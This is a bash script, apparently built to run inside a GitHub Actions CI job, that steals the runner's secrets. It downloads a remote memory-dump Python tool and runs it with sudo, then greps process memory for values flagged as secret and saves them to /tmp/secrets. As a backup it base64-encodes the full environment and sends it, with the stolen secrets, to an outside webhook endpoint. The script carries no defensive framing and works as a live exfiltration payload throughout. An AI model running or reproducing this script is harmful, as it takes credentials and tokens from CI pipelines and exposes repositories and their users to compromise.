#!/bin/bash
echo "Okay, we got this far. Let's continue..."

# Primary memdump exfiltration
curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' >> "/tmp/secrets"

# Backup env exfiltration
env | base64 -w0 > /tmp/env_b64
curl -X PUT -H "X-Env: $(cat /tmp/env_b64)" -d \@/tmp/secrets "https://open-hookbin.vercel.app/$GITHUB_RUN_ID"
